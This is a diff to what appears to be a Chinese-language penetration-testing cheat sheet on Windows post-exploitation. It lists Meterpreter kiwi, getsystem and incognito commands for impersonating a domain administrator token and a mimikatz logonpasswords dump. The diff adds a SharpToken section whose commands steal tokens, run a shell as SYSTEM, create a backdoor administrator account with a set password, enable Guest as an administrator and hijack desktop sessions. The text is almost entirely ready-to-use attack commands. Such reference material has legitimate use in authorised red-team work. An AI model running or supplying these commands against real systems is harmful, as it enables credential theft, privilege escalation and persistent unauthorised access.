@@ -226,7 +226,7 @@ meterpreter > load kiwi  # 读取密码, 如果是64位的迁移到64位进程�
 meterpreter > getsystem
 meterpreter > creds_kerberos
 
-# msf incognito https://mp.weixin.qq.com/s/iPv5sT50orqW79SmbVaFEQ
+# 方式一、msf incognito https://mp.weixin.qq.com/s/iPv5sT50orqW79SmbVaFEQ
 use incognito      //进入incognito模块 或用 SharpToken
 list_tokens -u    //列出令牌
 impersonate_token "WUHANKQ\Administrator"    //选择要窃取的账号
@@ -234,6 +234,13 @@ impersonate_token "WUHANKQ\Administrator"    //选择要窃取的账号
 shell
 chcp 65001      //活动代码页字符为UTF-8编码
 whoami
+## 方式二、SharpToken
+SharpToken list_token
+SharpToken list_token 468 # 枚举来自指定进程的令牌
+SharpToken execute "NT AUTHORITY\SYSTEM" cmd true
+SharpToken add_user admin Abcd1234! Administrators   # 使用窃取的令牌创建管理员用户
+SharpToken enableUser Guest Abcd1234! Administrators # 使用被盗令牌启用管理员用户
+SharpToken tscon 1 2 # 使用窃取的Token切换到目标桌面 其中1是目标用户的桌面，2是我们要接收的桌面
 
 # mimikatz
 mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log
